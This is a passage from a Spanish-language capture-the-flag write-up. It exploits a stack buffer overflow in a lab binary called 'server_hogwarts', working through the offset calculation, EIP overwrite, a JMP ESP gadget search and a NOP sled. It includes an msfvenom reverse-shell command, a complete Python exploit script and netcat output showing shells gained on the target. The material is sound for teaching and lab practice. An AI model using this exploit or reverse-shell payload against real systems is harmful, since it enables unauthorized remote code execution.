* Ya identificado, copia hasta donde indico el comando anterior e igual usalo dentro de echo y pipealo con `wc -c`:
```bash
echo -n "aaaabaaacaaadaaaeaaafaa..." | wc -c
116
```
Si quitamos los 4 caracteres que buscamos, seria un total de 112 el **offset**.

También lo podemos hacer de forma sencilla con el comando `pattern offset $eip`:
```bash
gef➤  pattern offset $eip
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```
Con eso, confirmamos la cantidad del **offset**.

<br>

<h3 id="identificacion">Sexto Paso: Identificando Ubicación de Representación de Caracteres</h3>

Estos registros son los que nos importan, pues son los registros de CPU hacia los cuales se pueden dirigir el **Buffer Overflow**:
* *EIP*: indica la siguiente dirección de memoria que el ordenador debería ejecutar.
* *EAX*: almacena temporalmente cualquier dirección de retorno.
* *EBX*: almacena datos y direcciones de memoria.
* *ESI*: contiene la dirección de memoria de los datos de entrada.
* *ESP*: se usa para referenciar el inicio de un hilo.
* *EBP*: indica la dirección de memoria del final de un hilo.

Más especificos, nos interesan estos dos: **EIṔ y EBP**.

Podemos confirmar que después del **offset**, se reescribe el **EIP** y luego se escriben más caracteres. 

Con **Python**, podemos generar varios caracteres para cumplir con el **offset**, sobreescribir el **EIP** y registrar n cantidad de caracteres después:
```bash
python3 -c 'print("A"*112 + "B"*4 + "C"*100)'
```

Con **gdb**, ejecuta el binario y manda el payload para ver la respuesta: 
```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcbbc  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffce50  →  0x0000000a ("\n"?)
$edx   : 0xffffcc94  →  0x0000000a ("\n"?)
$esp   : 0xffffcc30  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x080b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd178  →  "\nEnter your spell: "
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc30│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"    ← $esp
0xffffcc34│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc38│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc3c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc40│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc44│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc48│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffcc4c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x42424242 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────
```
Excelente, observa que ahí estan las **4 B's** que creamos con el payload dentro del **EIP** y después quedan registradas las **C's**.

Puedes ver que el **ESP** (el inicio de la pila) igual ya tiene las **C's**, lo que quiere decir que aquí es donde podemos meter el Shellcode.

Además, podemos inspeccionar el **ESP** desde **gdb** para comprobar lo del **ESP**:
```bash
gef➤  x/35wx $esp-5
0xffffcc2b:     0x42424241      0x43434342      0x43434343      0x43434343
0xffffcc3b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc4b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc5b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc6b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc7b:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcc8b:     0x43434343      0x43434343      0x00000a43      0x00000000
0xffffcc9b:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffccab:     0x6c655700      0x656d6f63      0x206f7420
```
Con esto comprobamos que el **EIP** empieza con las **B's** y luego comienza el **ESP** que vale las **C's**

<br>

<h3 id="shellcodeExploit">Septimo Paso: Creación de Shellcode y Creación de Exploit</h3>

Vamos muy bien, ahora podemos comenzar a crear nuestro Exploit en **Python**.

Primero crearemos el Shellcode que será una **Reverse Shell** con **msfvenom**.

Puedes crearlo para probarlo contra tu máquina o de una vez hacerlo para atacar el binario de la máquina víctima, pero en mi caso, lo hare para mi máquina:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -b "\x00" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
shellcode =  b""
shellcode += b"\xdb\...
...
...
```
Le indicamos a **msfvenom** lo siguiente:
* Crear una **Reverse Shell** para **arquitectura x86**.
* Mi IP y un puerto al que será dirigido.
* Que elimine el byte nulo (\x00), ya que puede darnos conflicto con el binario, pues esta hecho con **lenguaje C**.
* Crear el formato del payload en **Python**
* Especificamos el nombre de la variable que almacena el payload como **shellcode**.

Ahora, empezamos a crear nuestro Exploit con **Python**, siendo muy similar al script **spiker.py**:
```python
#!/usr/bin/python3

import socket

# Variables globales
ip_addr = "127.0.0.1 o VíctimaIP"
port = 9898
offset = 112
before_eip = b"A"*offset
eip = b"B"*4

shellcode =  b""
shellcode += b"\xdb\xda\xbd\xba\xee\x62\x1...
...
...
...

after_eip = shellcode

# Creando conexión y enviando shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_addr, port))
s.send(payload)
s.close()
```
Así va quedando nuestro script, pero aun faltan cosas por completar en los siguientes pasos.

<br>

<h3 id="OpCode">Octavo Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP</h3>

¿Qué es un **OpCode**?

| **Operation Code** |
|:-----------:|
| *El opcode (abreviatura de "operation code" o código de operación) es una parte fundamental de una instrucción en lenguaje máquina. Es el segmento de la instrucción que le dice a la CPU qué operación debe realizar.* |

<br>

Entonces, necesitamos buscar un **OpCode** donde se aplicara nuestro **Shellcode** para obtener la **Reverse Shell**.

Para esto, usamos el **EIP** para que apunte a una dirección de memoria donde se este aplique un **OpCode**, para que realice un salto (**JMP**) al **ESP**, que es donde queremos que se aplique el shellcode. Esto se le conoce como **JMP ESP**

Una herramienta que podemos ocupar es **nasm_shell** de **Metasploit Framework**.

Podemos invocarla usando su ruta completa `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` y le indicamos que busque el `JMP ESP`:
```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP
00000000  FFE4              jmp esp
```
El **OpCode** se representa así: `\xFF\xE4`.

Ahora, podemos buscarlo dentro del binario con la herramienta **objdump** y con **grep** buscamos el **OpCode**:
```bash
objdump -D server_hogwarts| grep "ff e4"
 8049d55:       ff e4                   jmp    *%esp
 80b322c:       81 73 f6 ff e4 73 f6    xorl   $0xf673e4ff,-0xa(%ebx)
 80b3253:       ff 91 73 f6 ff e4       call   *-0x1b00098d(%ecx)
 80b500f:       ff e4                   jmp    *%esp
 80b51ef:       ff e4                   jmp    *%esp
 80b546f:       ff e4                   jmp    *%esp
 80d0717:       ff e4                   jmp    *%esp
```
Se puede ocupar cualquiera que sea **JMP ESP**.

Lo puedes agregar de una vez al Exploit, pero el **OpCode** debe ir en formato **Little Endian** que básicamente es ponerlo de atras hacia adelante de la siguiente forma:
```bash
\x55\x9d\x04\x08 -> JMP ESP 8049d55
```

Se agregaria en la variable **eip**:
```python
eip = b"\x55\x9d\x04\x08"  # OpCode JMP ESP 8049d55
```

Vayamos al siguiente paso.

<br>

<h3 id="NOPs">Noveno Paso: Aplicando NOPs en Exploit</h3>

¿Qué son los **NOPs**?

| **No Operation (NOPs)** |
|:-----------:|
| *Los NOPs (del inglés No Operation, "sin operación") son instrucciones en lenguaje máquina o ensamblador que no realizan ninguna acción útil, excepto avanzar al siguiente ciclo de la CPU. Permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.* |

<br>

Es muy simple, únicamente debemos agregar la siguiente instrucción que es para **arquitectura x86**:
```bash
b"\x90"
```
El **NOP**, se puede multiplicar por 16 o por 32, pero en nuestro caso, al no tener tantas instrucciones, podemos multiplicarlo por 16.

Esto lo podemos agregar al Exploit en la variable **after_eip** junto al **Shellcode**:
```python
after_eip = b"\x90"*16 + shellcode  # ESP = Combinación de NOPs con shellcode
```
Sigamos.

<br>

<h3 id="Exploit">Decimo Paso: Prueba y Ejecución de Exploit</h3>

Con lo datos que ya hemos obtenido, nuestro Exploit debería quedar así:
```python
#!/usr/bin/python3

import socket

# Variables globales
ip_addr = "127.0.0.1 o VíctimaIP"
port = 9898

def exploit(ip_addr, port):

        offset = 112

        before_eip = b"A" * offset  # Limite de binario

        eip = b"\x55\x9d\x04\x08"  # OpCode JMP ESP 8049d55

        shellcode =  b""
        shellcode += b"\xdb\xda\xbd\xba\xee\x62\x1...
	...
	...
	...

        after_eip = b"\x90"*16 + shellcode  # ESP = Combinación de NOPs con shellcode

        payload = before_eip + eip + after_eip

        try:
                # Creando conexión y enviando shellcode
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print(f"\n[+] Conectando a {ip_addr}:{port}...\n")
                s.connect((ip_addr, port))

                # Enviando payload
                s.send(payload)
                print(f"\n[*] Payload lanzado: {payload}")

        # Manejo de errores
        except socket.error as e:
                print(f"[!] Error de conexión: {e}")

        except Exception as e:
                print(f"[!] Ocurrio un error: {e}")

        # Cerrando la conexión
        finally:
                s.close()
                print("\n[+] Cerrando conexión.")


if __name__ == '__main__':
        exploit(ip_addr, port)
```
Lo estructure mejor para que maneje errores como el **spiker.py**.

Ahora, podemos probarlo con nuestra máquina, aunque debo decir que debe ser ejecutado varias veces para poder obtener una shell.

Abre una **netcat** y ejecuta el Exploit hasta obtener la shell:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [Tu_IP] 40950
whoami
root
ls
exploitMonkeycom.py
server_hogwarts
spiker.py
```

Igual podemos probarlo directamente con la máquina víctima, si es que pusiste su IP en el script.

Abre una **netcat** y ejecuta el Exploit:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.007] 34188
whoami
harry
```
Con esto, hemos ejecutado un **Buffer Overflow** exitosamente.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>





<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
